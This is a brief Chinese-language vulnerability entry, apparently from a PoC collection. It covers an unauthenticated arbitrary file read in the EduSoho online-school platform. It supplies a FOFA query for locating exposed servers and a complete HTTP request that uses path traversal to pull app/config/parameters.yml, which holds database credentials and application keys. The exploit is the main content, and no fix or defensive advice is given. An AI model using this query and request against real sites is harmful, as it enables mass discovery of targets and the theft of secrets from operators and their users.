## EduSoho教培系统classropm-course-statistics存在任意文件读取漏洞

EduSoho 教培系统是由杭州阔知网络科技研发的开源网校系统。EduSoho教培系统classropm-course-statistics存在任意文件读取漏洞，未授权的攻击者可通过该漏洞读取敏感文件如app/config/parameters.yml，获取系统数据库账号密码，应用密钥等敏感信息。

## fofa

```
body="Powered By EduSoho" || body="www.edusoho.com"
```

## poc

```
GET /export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=2vtqc388p6rhcueiipc5l97jtg
Upgrade-Insecure-Requests: 1
```

![image-20240707200131136](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407072001203.png)